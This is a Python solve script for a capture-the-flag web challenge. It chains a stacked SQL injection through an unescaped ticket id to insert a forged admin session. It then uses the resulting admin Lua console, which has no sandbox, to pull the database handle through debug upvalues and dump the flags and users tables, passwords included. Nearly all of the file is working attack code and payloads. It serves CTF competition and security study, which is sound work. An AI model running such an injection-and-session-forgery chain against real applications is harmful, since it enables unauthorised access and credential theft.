#!/usr/bin/env python3
"""PwnSec Support -- stacked SQLi -> forged admin session -> unsandboxed Lua console -> flag.

The portal is a Lua app (embedded Lua 5.5) running as a guest image on `l3afvm`, a custom
ISA emulator. The whole Lua source is recoverable from the NDJSON guest image: every
["DATA_BYTES", "embedded_lua_module_N", hex] line is one module.

Three facts from that source (web/app.lua):

  * `/ticket?id=` interpolates the parameter with **no escaping at all**:
        "... FROM tickets t, users u WHERE t.reporter_id = u.id AND t.id = " .. id
    while `/login` does escape via sql_param(). sql.query() runs
    `parser.parse(sql)` -> *statements* (plural) and the tokenizer has TOK_SEMICOLON,
    so **stacked statements execute**.
  * `/admin?token=` is likewise unescaped, and `check_admin` only needs one row from
        SELECT u.id, u.username FROM sessions s, users u
        WHERE s.token = '<token>' AND s.user_id = u.id AND u.is_admin = 1
    A quote-break cannot help here because `sessions` starts empty and the FROM is a cross
    join -- so instead we *create* the session row with the stacked INSERT.
  * `/admin` then exposes `run_lua(code)` = bare `load(code)` with **no sandbox**: full
    `io`, `os`, `debug`, `package`.

Inside the VM there is no filesystem and no environment (`io.open` -> "System Error",
`os.getenv` -> nil), so the flag is read from the database. `db` is a local upvalue of
`web.app`, reachable as `debug.getupvalue(package.loaded["web.app"].start, 1)`.

Usage: solve.py <base-url>
"""
import html
import re
import sys

import requests

TOKEN = "pwnpwn"

LUA = r"""
local app = package.loaded["web.app"]
local _, db  = debug.getupvalue(app.start, 1)
local _, sql = debug.getupvalue(app.start, 2)
print(sql.format_results(sql.query(db, "SELECT * FROM flags")))
print(sql.format_results(sql.query(db, "SELECT id, username, password, is_admin FROM users")))
"""


def out(resp: requests.Response) -> str:
    m = re.search(r'<pre class="out">(.*?)</pre>', resp.text, re.S)
    return html.unescape(m.group(1)) if m else ""


def main() -> int:
    base = sys.argv[1].rstrip("/")
    s = requests.Session()
    s.verify = False

    # 1. stacked INSERT through the unescaped numeric id -> a session for root (is_admin=1)
    inj = (f"1; INSERT INTO sessions (token, user_id, expires_at, ip_address) "
           f"VALUES ('{TOKEN}', 1, '2099-01-01 00:00:00', '1.1.1.1')")
    r = s.get(f"{base}/ticket", params={"id": inj}, timeout=60)
    print(f"[1] stacked INSERT -> {r.status_code}")

    # 2. the forged token satisfies check_admin
    r = s.get(f"{base}/admin", params={"token": TOKEN}, timeout=60)
    if "Lua Console" not in r.text:
        print("[!] admin console not reached", file=sys.stderr)
        return 1
    who = re.search(r"Signed in as <b>([^<]*)</b>", r.text)
    print(f"[2] Lua console as {who.group(1) if who else '?'}")

    # 3. unsandboxed Lua: reach `db` through the module's upvalues and read the flag table
    r = s.post(f"{base}/admin", data={"token": TOKEN, "code": LUA}, timeout=90)
    text = out(r)
    print("[3] console output:\n" + text)

    m = re.search(r"(pwnsec\{[^}]*\}|psctf\{[^}]*\})", text)
    if m:
        print("FLAG:", m.group(1))
        return 0
    print("[!] no flag in the flags table", file=sys.stderr)
    return 1


if __name__ == "__main__":
    requests.packages.urllib3.disable_warnings()
    sys.exit(main())
